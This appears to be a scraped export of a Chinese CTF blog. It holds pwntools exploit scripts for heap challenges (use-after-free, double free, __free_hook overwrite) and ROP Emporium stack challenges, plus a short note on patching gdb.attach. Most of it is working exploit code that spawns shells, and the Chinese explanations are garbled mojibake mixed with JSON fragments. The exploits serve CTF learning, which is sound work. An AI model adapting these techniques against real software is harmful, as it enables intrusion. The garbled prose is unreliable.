freeå‰è¨€æœ€è¿‘å¼€å§‹æ‰“ç®—å…¥é—¨å †ï¼Œç®€å•è®°å½•å‡ é“ç›¸å…³çš„é¢˜ã€‚ hitcontraining-uafé¢˜ç›®è¾ƒä¸ºç®€å•å­˜åœ¨åé—¨å‡½æ•°ï¼Œåˆ©ç”¨uafæ¼æ´æ”»å‡»å³å¯ã€‚ expfrom pwn import * local_file = './hacknote' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27892) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = 'debug' context.arch = elf.arch context.terminal = ['tmux','splitw','-h']#,'neww' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=\"b main\") gdb.attach(io) pause() def add(size,content): sl('1') ru('Note size ') sl(str(size)) ru('Content :') sl(str(content)) def dele(index): sl('2') sl(str(index)) def show(index): sl('3') sl(str(index)) ru('Your choice :') add(16,'aaaa') ru('Your choice :') add(16,'bbbb') ru('Your choice :') dele(0) ru('Your choice :') dele(1) ru('Your choice :') add(8,p32(elf.symbols['magic'])) ru('Your choice :') show(0) itr() ACTF_2019_babyheapé¢˜ç›®æœ‰systemå‡½æ•°ï¼Œå¹¶ä¸”ä¹Ÿæœ‰/bin/sh\\x00 ï¼Œå½“æ—¶åœ¨æ„é€ è¿™ä¸ª/bin/sh\\x00çš„å­—ç¬¦ä¸²æŒ‡é’ˆçš„æ—¶å€™è´¹äº†ä¸€ç‚¹åŠ²ï¼Œç»“æœå‘ç°elfæœ‰è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶åå°±å¾ˆç®€å•äº†ï¼Œæ§åˆ¶å¥½å‚æ•°å³å¯ã€‚è¿˜æ˜¯uafæ¼æ´è¿›è¡Œæ”»å‡»ã€‚ expfrom pwn import * local_file = './ACTF_2019_babyheap' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27341) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = 'debug' context.arch = elf.arch context.terminal = ['tmux','splitw','-h']#,'neww' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=\"b main\") gdb.attach(io) pause() def add(size,content): sla('Your choice: ','1') sla('size: \\n',str(size)) sa('content: \\n',str(content)) def dele(index): sla(': ','2') sla('index: \\n',str(index)) def show(index): sla(': ','3') sla('index: \\n',str(index)) add(32,'aaaaaaaa') #0 add(32,'bbbbbbbb') #1 dele(0) dele(1) binsh = 0x602010 add(16,flat(binsh,elf.plt['system'])) # dbg() show(0) itr() actf-2019-messageDouble freeï¼Œè¿ç§»åˆ°ä¼ªé€ çš„å †å—ï¼Œæ³¨æ„æ§åˆ¶å¥½ä¼ªé€ å †å—çš„sizeè·Ÿfastbinçš„å¯¹åº”ã€‚æ”¹__free_hookä¸ºsystemå³å¯ã€‚__free_hookçš„å‚æ•°æ­£å¥½æ˜¯å †å—çš„dateï¼Œè¾ƒå¥½æ§åˆ¶ã€‚ï¼ˆbuuç»™çš„å¤ç°ç¯å¢ƒæ˜¯18çš„ï¼Œæœ‰äº†tcacheæœºåˆ¶ï¼Œä½†æ˜¯æœ¬äººè¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œåªæ˜¯çŸ¥é“ä¸æ£€æŸ¥sizeæ˜¯å¦å¯¹åº”äº†ï¼Œåœ¨16ä¸Šåšçš„ï¼Œç„¶åå°±è°ƒè¯•æ”¹äº†æ”¹è„šæœ¬ï¼Œæ‰“é€šäº†buuçš„å¤ç°ç¯å¢ƒã€‚ä¸‹é¢çš„expä¹Ÿæ˜¯18çš„ã€‚ï¼‰ expfrom pwn import * local_file = './ACTF_2019_message' # local_libc = '/lib/x86_64-linux-gnu/libc-2.27.so' # remote_libc = local_libc # '../libc.so.6' debug = 1 if debug: io = process(local_file) # libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',25390) # libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = 'debug' context.arch = elf.arch context.terminal = ['tmux','splitw','-h']#,'neww' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + ': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=\"b main\") gdb.attach(io) pause() def add(length,contend) : sla('choice: ','1') sla('length of message:\\n',str(length)) sa('message:\\n',str(contend)) def free(index): sla('choice: ','2') sla('to delete:\\n',str(index)) def edit(index,contend): sla('choice: ','3') sla('to edit:\\n',str(index)) sa('the message:\\n',str(contend)) def show(index): sla('choice: ','4') sla('to display:\\n',str(index)) add(0x30,'a') #0 add(0x20,'a') #1 add(0x20,'a') #2 free(1) free(2) free(1) add(0x20,p64(0x602068)) add(0x20,'aaaaaaaa') add(0x20,'aaaaaaaa') contend = p64(elf.got['puts'])# + p64(0x30) + p64(elf.got['puts']) add(0x20,contend) show(0) ru(' message: ') puts = uu64(r(6)) libc_base = puts - libc.symbols['puts'] free_hook = libc_base + libc.symbols['__free_hook'] print('puts' + hex(puts)) print('libc_base' + hex(libc_base)) system = libc_base + libc.symbols['system'] contend = p64(free_hook) dbg() edit(6,contend) # dbg() contend = p64(system) edit(0,contend) # dbg() add(0x8,'/bin/sh\\x00') free(7) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"http://chumen77.xyz/tags/å­¦ä¹ è®°å½•/"}]},{"title":"pwntoolsçš„gdb.attach","slug":"pwntoolsçš„gdb.attach","date":"2020-04-20T04:21:15.070Z","updated":"2020-07-16T13:15:04.024Z","comments":true,"path":"2020/04/20/pwntoolsçš„gdb.attach/","link":"","permalink":"http://chumen77.xyz/2020/04/20/pwntoolsçš„gdb.attach/","excerpt":"","text":"pwntoolsçš„gdb.attachå‰è¨€æœ€è¿‘åœ¨å°è¯•å­¦ç€æ›´å¿«çš„è°ƒè¯•expï¼Œå¾ˆæ—©å°±äº†è§£åˆ°è¿™ä¸ªgdb.attachï¼Œä½†æ˜¯æœ¬äººæ˜¯sshè¿ä¸Šå»çš„ï¼Œæ ¹æœ¬ç”¨ä¸äº†ã€‚ç„¶åå°è¯•tmuxè¿™ä¸ªç¥å™¨ï¼Œæ¥å®ç°gdb.attachã€‚æˆåŠŸä»¥åå‘ç°ä¸€ä¸ªä¸å¥½çš„ç‚¹ï¼Œpwntools gdb.attachä¸Šçš„gdbè°ƒè¯•ä¸­ï¼Œå¾ˆå¤šå‡½æ•°æ˜¯æ²¡æœ‰ç¬¦å·è¡¨çš„ï¼Œè°ƒè¯•èµ·æ¥åè€Œéš¾åº¦å¢åŠ ã€‚è‡ªå·±æ‰‹åŠ¨gdb.attachä¸Šå»ã€‚ç„¶åå‘ç°è°·æ­Œä¹Ÿè°·æ­Œä¸å‡ºæ¥ï¼Œå°±æ¥æŠ˜è…¾æºç äº†ã€‚ç‰ˆæœ¬å· ï¼špwntools (4.0.1) æ”¹å–„å› ä¸ºæ­£å¸¸æœ¬äººéƒ½æ˜¯ chumen77@chumen-77:~$ gdb at pid è¿™æ ·æ¥è¿›è¡Œattachã€‚å‘ç°ç”¨pwntoolsæ—¶å€™ï¼Œå®ƒè¿›è¡Œçš„å‘½ä»¤æ˜¯è¿™æ ·çš„ï¼Œç„¶åæ€è·¯å°±æ¥äº†æ‰¾åˆ°ç›¸å…³æºç ï¼Œæ”¹ä¸€ä¸‹å°±å¥½äº†ã€‚ æ‰¾å…³é”®å¤„/running in new terminal åˆ é™¤2è¡Œå’Œä¿®æ”¹ä¸€è¡Œä»£ç ï¼ˆ-q æ”¹æˆ atï¼‰å³å¯ã€‚ å‘ç°å·²ç»å¯ä»¥äº†ã€‚","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"æ‚é¡¹","slug":"æ‚é¡¹","permalink":"http://chumen77.xyz/tags/æ‚é¡¹/"}]},{"title":"Ropemporium é€šå…³è®°å½•","slug":"Ropemporiumé€šå…³è®°å½•","date":"2020-04-13T04:32:06.614Z","updated":"2020-08-02T15:30:06.189Z","comments":true,"path":"2020/04/13/Ropemporiumé€šå…³è®°å½•/","link":"","permalink":"http://chumen77.xyz/2020/04/13/Ropemporiumé€šå…³è®°å½•/","excerpt":"","text":"Ropemporium é€šå…³è®°å½•ret2winä¿æŠ¤å’ŒarchArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) idaåˆ†æé¢˜ç›®ç»™äº†æç¤ºï¼Œ32çš„bufå´å¯ä»¥å¡«å……50ä¸ªå­—èŠ‚ã€‚å¹¶ä¸”æ¥å—ç”¨çš„æ˜¯fgetsï¼Œè¿™ä¸ªå‡½æ•°ä¸ç”¨æ‹…å¿ƒç©ºå­—èŠ‚ã€‚ int ret2win() &#123; printf(\"Thank you! Here's your flag:\"); return system(\"/bin/cat flag.txt\"); &#125; å¹¶ä¸”å­˜åœ¨æ¼æ´å‡½æ•°ã€‚ exp32ä½from pwn import * context.arch = 'i386' io = process('./ret2win32') io.recvuntil('&gt;') payload = 'a' * 44 + p32(0x08048659) io.sendline(payload) io.interactive() 64ä½from pwn import * context.arch = 'amd64' io = process('./ret2win') io.recvuntil('&gt;') payload = 'a' * 40 + p64(0x00000400811) io.sendline(payload) io.interactive() splitä¿æŠ¤å’ŒarchArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) idaåˆ†æint usefulFunction() &#123; return system(\"/bin/ls\"); &#125; åé—¨å‡½æ•°å˜æˆäº†è¿™æ ·ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°æœ‰cat flagçš„å­—ç¬¦ä¸²ã€‚è¿™æ ·åªéœ€è¦æ§åˆ¶systemçš„å‚æ•°å³å¯ã€‚ exp32ä½ï¼šfrom pwn import * context.arch = 'i386' io = process('./split32') key = 0x0804A030 # /bin/cat flag.txt' io.recvuntil('&gt;') offset = 44 payload = 'a' * offset + p32(0x08048657) + p32(0x0804A030) raw_input('-&gt;') io.sendline(payload) io.interactive() 64ä½ï¼šfrom pwn import * context.arch = 'amd64' io = process('./split') io.recvuntil('&gt;') key = 0x00601060 # /bin/cat flag.txt' offset = 40 pop_rdi_ret = 0x0000000000400883 payload = 'a' * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload) io.interactive() callmeidaåˆ†ævoid __noreturn usefulFunction() &#123; callme_three(4LL, 5LL, 6LL); callme_two(4LL, 5LL, 6LL); callme_one(4LL, 5LL, 6LL); exit(1); &#125; è¿™ä¸ªæ˜¯å…³é”®å‡½æ•°ï¼Œä½†æ˜¯å…¶æ˜¯ç”¨åˆ°äº†ç»™çš„soæ–‡ä»¶ï¼Œç„¶åidaæ¥åˆ†æsoæ–‡ä»¶ã€‚ æ‰¾åˆ°ä»¥åå‘ç°åº”è¯¥æ˜¯æŒ‰ç…§é¡ºåºè°ƒç”¨callme-oneï¼Œcallme-twoï¼Œcallme-threeéœ€è¦æ³¨æ„å…¶å‚æ•°éƒ½è¦æ˜¯1ï¼Œ2ï¼Œ3.å½“åˆç¨‹åºä¸­ç»™çš„æ˜¯4ï¼Œ5ï¼Œ6 éœ€è¦æƒ³åŠæ³•æ¥æ¢æ‰è¿™ä¸ªå‚æ•°ã€‚ exp32ä½ï¼šfrom pwn import * context.arch = 'i386' io = process('./callme32') io.recvuntil('&gt;') offset = 44 callme_one = 0x080485C0 callme_two = 0x08048620 callme_three = 0x080485B0 pop3_ret = 0x080488a9 payload = 'a' * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3) raw_input('-&gt;') io.sendline(payload) io.interactive() å…¶ä¸­pop3_ret æ˜¯ç”¨æ¥ä¿æŒæ ˆå¹³è¡¡çš„ï¼Œä¸”ç«™çš„ä½ç½®å‡½æ•°çš„è¿”å›åœ°å€ã€‚è¿˜æœ‰éœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼šæ³¨æ„å¡«å……ä»¥åçš„è¿”å›åœ°å€å¡«çš„æ—¶å€™ï¼Œé€šå¸¸å¡«çš„æ˜¯ä»£ç æ®µçš„æ•°æ®ï¼Œä½†æ˜¯è¿™é‡Œæ±‡ç¼–æ˜¯callæ‰€ä»¥åœ¨å¡«çš„æ—¶å€™ï¼Œåº”è¯¥æ˜¯å¡«å……å…¶pltçš„åœ°å€ã€‚ 64ä½ï¼šfrom pwn import * context.arch = 'amd64' io = process('./callme') io.recvuntil('&gt;') offset = 40 callme_one = 0x00401850 callme_two = 0x000401870 callme_three = 0x00401810 pop3_ret = 0x0000000000401ab0 payload = 'a' * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one) payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two) payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three) raw_input('-&gt;') io.sendline(payload) io.interactive() åˆ©ç”¨ 0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; retè¿™ä¸ªgadgetæ¥æ§åˆ¶å‚æ•°ã€‚ write4idaåˆ†æè¿™ä¸ªé¢˜è·Ÿå‰é¢ç¬¬2é¢˜å¾ˆåƒï¼Œä½†æ˜¯å°±æ˜¯æ²¡æœ‰ç»™ä½ cat flag çš„å­—ç¬¦ä¸²äº†ã€‚éœ€è¦è‡ªå·±ç”¨ç¨‹åºçš„gadgetæ¥æ„é€ ã€‚æ€è·¯ä¹Ÿå°±æ˜¯è¿›è¡ŒropæŠŠ/bin/shå¾€bssæ®µä¸Šå†™,ç„¶åæ¥ç€æ‹¿shellå°±å¥½äº†ã€‚ ROPgadget --binary ./write4 --only \"mov|pop|ret\" æŸ¥å¥½ç”¨çš„gadgetsï¼šåˆ©ç”¨è¿™å³å¯å°±å¯ä»¥äº†ï¼Œ32ä½çš„ç±»ä¼¼ã€‚ exp32ä½ï¼šfrom pwn import * context.arch = 'i386' io = process('./write432') io.recvuntil('&gt;') elf = ELF('./write432') # bin_sh = elf.search('/bin/cat').next() offset = 44 bss = 0x804A06C-0x10 pop_edi_pop_ebp_ret = 0x080486da system = 0x8048430 key = 0x08048670 #mov dword ptr [edi], ebp ; ret payload = 'a' * offset + flat([pop_edi_pop_ebp_ret,bss,'sh\\x00\\x00',key,system,0xdeadbeef,bss]) raw_input('-&gt;') io.sendline(payload) io.interactive() 64ä½ï¼šfrom pwn import * context.arch = 'amd64' io = process('./write4') io.recvuntil('&gt;') elf = ELF('./write4') # bin_sh = elf.search('/bin/cat').next() offset = 40 bss = 0x601090-0x10 key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; ret key2 = 0x0000000000400890# pop r14 ; pop r15 ; ret key3 = 0x0000000000400893#pop rdi ; ret system = 0x000004005E0 payload = 'a' * offset + flat([key2,bss,'/bin/sh\\x00',key1,key3,bss,system]) raw_input('-&gt;') io.sendline(payload) io.interactive() badcharsidaåˆ†æè¿™ä¸ªé¢˜ç›®è·Ÿå‰ä¸€ä¸ªwrite4ååˆ†çš„ç›¸ä¼¼ï¼Œä½†æ˜¯å…¶è¿‡æ»¤äº†ä¸ªåˆ«å­—ç¬¦ï¼šä¼šå°†å…¶æ›¿æ¢ä¸º0xEBï¼Œä¸ªäººè§£å†³åŠæ³•å°±æ˜¯åœ¨bssæ®µå†™å¥½è¢«ç¨‹åºå¤„ç†è¿‡çš„å­—ç¬¦ä¸²åï¼Œåœ¨ç”¨xorçš„gadgetsæ¥é‡æ–°æ”¹å›æ¥ï¼Œä¸ºäº†ä¾¿äºåˆ©ç”¨ï¼Œ32ä½å’Œ64ä½éƒ½æ˜¯æ„é€ system(sh)æ¥æ‹¿çš„shellã€‚ä¾‹å­ï¼šä¼ è¿‡å»çš„æ˜¯sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00 åˆ°bssæ˜¯è¿™ä¸ªæƒ…å†µï¼Œç„¶åå»æ‰¾xorçš„gadgetï¼šå…¶ä¸­æ³¨æ„è¿™æ˜¯ä»¥ä¸€ä¸ªbyteæ¥è¿›è¡Œxorçš„ï¼Œç„¶åè¿™ä¸ªå›¾xorçš„å€’æ•°ç¬¬ä¸€æ¡è¯­å¥ï¼Œ**å…¶ä¸­çš„æ˜¯dhï¼Œè¿™ä¸ªæ˜¯edxçš„é«˜ä½ã€‚r14bæ˜¯r14çš„ä½ä½ä¹Ÿæ˜¯ä¸€ä¸ªbyteçš„å­—èŠ‚å•ä½ã€‚è¿™ä¸ªé¢˜ç›®åœ¨gdbè°ƒè¯•expæ—¶ä¼šå‘ç°æœ‰æ¯”è¾ƒä¾¿æ·çš„åŠæ³•ã€‚ exp32ä½ï¼šfrom pwn import * context.arch = 'i386' io = process('./badchars32') io.recvuntil('&gt;') elf = ELF('./badchars32') key1 = 0x08048893# mov dword ptr [edi], esi ; ret key2 = 0x08048899# pop esi ; pop edi ; ret key3 = 0x08048461# pop ebx ; ret bss = 0x804A06C-10 key4 = 0x08048897# pop ecx ; ret key5 = 0x08048890#xor byte ptr [ebx], cl ; ret sys = 0x080484E0 offset = 44 payload = 'a' * offset + flat([key2,'sh\\x00\\x00',bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss]) raw_input(\"-&gt;\") io.sendline(payload) io.interactive() 64ä½ï¼šfrom pwn import * context.arch = 'amd64' io = process('./badchars') io.recvuntil('&gt;') elf = ELF('./badchars') offset = 40 bss = 0x6010B0 key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; ret key2 = 0x0000000000400b3b# pop r12 ; pop r13 ; ret key3 = 0x0000000000400b39#pop rdi ; ret key4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; ret key5 = 0x0000000000400b40#pop r14 ; pop r15 ; ret system = 0x004006F0 payload = 'a' * offset + flat([key2,'sh\\x00\\x00\\x00\\x00\\x00\\x00',bss,key1,key5,0x98,bss,key4,key3,bss,system]) raw_input('-&gt;') io.sendline(payload) io.interactive() fluffè¿™ä¸ªé¢˜ç›®è¿˜æ˜¯è·Ÿwrite4å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯æ‰¾å¯ç”¨çš„gadgetæ˜¯ï¼Œæ¯”è¾ƒéš¾æ‰¾ã€‚éœ€è¦æƒ³å°½åŠæ³•æ‰¾å„ç§gadgetï¼Œç„¶åå åŠ åœ¨ä¸€èµ·æˆä¸ºéœ€è¦çš„é“¾ã€‚è¿™ä¸ªé¢˜çªç ´å£ä¹Ÿå°±åœ¨ï¼š mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret ç„¶åå†å»æ‰¾ecxï¼Œedxç›¸å…³çš„gadgetï¼Œé‡Œé¢ç”¨åˆ°äº†xorå’Œxchgç­‰ç›¸å…³çš„gadgetã€‚å…¶ä¸­64ä½çš„æ‰¾å¯ç”¨gadgetï¼Œè¿˜éœ€è¦æ§åˆ¶ä¸€ä¸‹æ·±åº¦ï¼š ROPgadget --binary ./fluff --depth 15 è¿™æ ·æ‰¾å‡ºè¶³å¤Ÿçš„gadgetï¼Œä»¥ä¾¿è‡ªå·±è¯•ç”¨ã€‚ exp32ä½ï¼šfrom pwn import * context.arch = 'i386' io = process('./fluff32') io.recvuntil('&gt;') elf = ELF('./fluff32') key1 = 0x080483e1# pop ebx ; ret key2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret key3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret bss = 0x804A06C key4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret key5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret sys = 0x8048430 offset = 44 payload = 'a' * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,'sh\\x00\\x00',key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss]) raw_input(\"-&gt;\") io.sendline(payload) io.interactive() 64ä½ï¼šfrom pwn import * context.arch = 'amd64' io = process('./fluff') io.recvuntil('&gt;') elf = ELF('./fluff') key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; ret key2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret key3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret bss = 0x601090 key4 = 0x0000000000400840## : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret key5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret key6 = 0x00000000004008c3# pop rdi ; ret sys = 0x4005E0 offset = 40 payload = 'a' * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,'/bin/sh\\x00',key2,1,key3,1,key5,1,0,key6,bss,sys]) raw_input(\"-&gt;\") io.sendline(payload) io.interactive() pivotè¿™ä¸ªé¢˜ä¸€çœ‹å°±æ˜¯æ ˆè½¬ç§»äº†ã€‚ idaåˆ†æå¯ä»¥çœ‹åˆ°ä¼šç»™ä½ æ³„æ¼ä¸€ä¸ªå †åœ°å€ï¼Œç»™ä½ å»æ ˆè½¬ç§»ã€‚æ¥ç€çœ‹åé—¨å‡½æ•°ï¼Œå‘ç°è¿™é‡Œcallä¸€ä¸ªä¸libcè¿æ¥çš„å‡½æ•°ï¼š æ¥ç€åˆ†æä¸€ä¸‹ç»™å®šçš„soæ–‡ä»¶ï¼š void __noreturn ret2win() &#123; system(\"/bin/cat flag.txt\"); exit(0); &#125; æ¥ç€å°±æœ‰æ€è·¯äº†ï¼Œæ ˆè½¬ç§»åˆ°ç»™ä½ çš„å †åœ°å€ä¸Šï¼Œç„¶åæ„é€ ropé“¾ï¼š leak foothold_function_got ç®—å‡ºç»™çš„libcåŸºå€ï¼Œå›åˆ°startï¼Œå†æ¬¡åˆ©ç”¨æ¼æ´ æ„é€ jmpåˆ°ret2winçš„é“¾å³å¯ä½†æ˜¯è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯æœ‰æŠ€å·§çš„ï¼Œå‘ç°ç»™ä½ çš„å †åœ°å€å…¶å®è·Ÿè¿™ä¸ªlibcçš„å†…å­˜æ˜ å°„æ˜¯å¾ˆè¿‘çš„ï¼Œå¹¶ä¸”æ¯æ¬¡å·®è·ä¹Ÿæ˜¯å›ºå®šçš„ã€‚é‚£å°±å¯ä»¥ç›´æ¥åˆ†æsoæ–‡ä»¶ï¼Œæ¥ç®—å–åç§»ï¼Œç›´æ¥åˆ©ç”¨ã€‚ æ ¹æ®ç»™çš„å †åœ°å€å’Œsoæ–‡ä»¶æ˜ å°„åŸºå€ï¼š exp132ä½ï¼šfrom pwn import * context.arch = 'i386' context.log_level = 'debug' io = process('./pivot32') elf = ELF('./pivot32') libc = ELF('./libpivot32.so') foothold_function_plt = elf.plt['foothold_function'] foothold_function_got = elf.got['foothold_function'] put_plt = elf.plt['puts'] key1 = 0x080486a8 #: leave ; ret io.recvuntil('0x') leak = int(io.recv(8),16) print('leak_stack'+ hex(leak)) io.recvuntil('now and it will land there') io.recvuntil('&gt;') payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got]) raw_input('-&gt;') io.sendline(payload) io.recvuntil('stack smash') io.recvuntil('&gt;') payload = 40 * 'a' + p32(leak) +p32(key1) io.sendline(payload) io.recvuntil('foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so') leak = u32(io.recv(4)) print('leak'+ hex(leak)) ret2win = leak - libc.symbols['foothold_function'] + libc.symbols['ret2win'] io.recvuntil('now and it will land there') io.recvuntil('&gt;') io.sendline('1') io.recvuntil('send your stack smash') payload = 'a' * 44 + p32(ret2win) io.sendline(payload) io.interactive() 64ä½ï¼šfrom pwn import * context.arch = 'amd64' context.log_level = 'debug' io = process('./pivot') elf = ELF('./pivot') libc = ELF('./libpivot.so') foothold_function_plt = elf.plt['foothold_function'] foothold_function_got = elf.got['foothold_function'] offset = libc.symbols['foothold_function'] - libc.symbols['ret2win'] put_plt = elf.plt['puts'] key1 = 0x0000000000400a39 #: leave ; ret key2 = 0x0000000000400b73#pop rdi ; ret key3 = 0x0000000000400b02#xchg rax, rsp ; ret key4 = 0x0000000000400b00#pop rax ; ret print('offset:' + hex(offset)) io.recvuntil('0x') leak = int(io.recv(12),16) print('leak_stack'+ hex(leak)) io.recvuntil('now and it will land there') io.recvuntil('&gt;') payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0]) raw_input('-&gt;') io.sendline(payload) io.recvuntil('stack smash') io.recvuntil('&gt;') payload = 40 * 'a' + p64(key4)+ p64(leak) + p64(key3) io.sendline(payload) io.recvuntil('foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so') leak = int(u64(io.recv(6).ljust(8,'\\x00'))) print('leak'+ hex(leak)) ret2win = leak - libc.symbols['foothold_function'] + libc.symbols['ret2win'] print('ret2win'+ hex(ret2win)) # raw_input('-&gt;') io.recvuntil('&gt;') payload = 'a' * 40 + p64(ret2win) io.sendline(payload) io.interactive() è¿™ä¸ªåœ°æ–¹å› ä¸ºæ˜¯fgetså‡½æ•°æ¥è·å–å­—ç¬¦ä¸²ï¼Œå…¶é‡åˆ°æ¢è¡Œå°±ä¼šç»“æŸï¼Œä½†æ˜¯åœ¨æ‰¾gadgat çš„æ—¶å€™å‘ç°leave retçš„è¿™ä¸ªgadgetï¼Œåœ°å€éƒ½æ˜¯æœ‰0x0a,æ‰€ä»¥åªèƒ½æ›´æ¢gadgetï¼Œæ¥ä¼ªé€ æ ˆã€‚ exp232ä½ï¼šfrom pwn import * context.arch = 'i386' context.log_level = 'debug' io = process('./pivot32') elf = ELF('./pivot32') offset = 44 io.recvuntil('0x') leak1 = int(io.recv(8),16) + 1921272 + 0x000000967 print('leak'+ hex(leak1)) raw_input('-&gt;') payload = offset * 'a' + p32(leak1) io.sendline('1') io.recvuntil('send your stack smash') io.sendline(payload) io.interactive() 64ä½ï¼šfrom pwn import * context.arch = 'amd64' context.log_level = 'debug' io = process('./pivot') elf = ELF('./pivot') libc = ELF('./libpivot.so') offset = 40 io.recvuntil('0x') leak1 = int(io.recv(12),16) + 3977456 + libc.symbols['ret2win'] raw_input('-&gt;') payload = offset * 'a' + p64(leak1) io.sendline('1') io.recvuntil('send your stack smash') io.sendline(payload) io.interactive() ret2csuè¿™ä¸ªé¢˜ç›®å°±æ˜¯å†è€ƒret2csuï¼ˆ64ä½çš„ä¸‡èƒ½gadgetï¼‰ï¼Œè®©ä½ æ§åˆ¶rdxï¼ˆç¬¬ä¸‰ä¸ªå‚æ•°çš„å¯„å­˜å™¨ï¼‰ä¸º0xdeadcafebabebeef å°±å¯ä»¥äº†ã€‚ä½†æ˜¯æ¯”è¾ƒéš¾æçš„ä¸€ç‚¹æ˜¯ï¼šåœ¨è¿™ä¸ªåœ°æ–¹æ˜¯callï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥å¡«ä¸€ä¸ªgotçš„åœ°å€ã€‚ä¸èƒ½æ˜¯ä¸€ä¸ªåœ°å€æˆ–è€…pltã€‚å› ä¸ºcall 0xaaaaa æ±‡ç¼–ä½œç”¨ï¼š push PCï¼ˆä¹Ÿå°±æ˜¯è¯¥æ±‡ç¼–æŒ‡ä»¤çš„ä¸‹ä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤çš„åœ°å€ï¼‰ jmp [0xaaaaa] æ˜¯è¯¥å‡½æ•°pointæŒ‡å‘çš„åœ°å€ 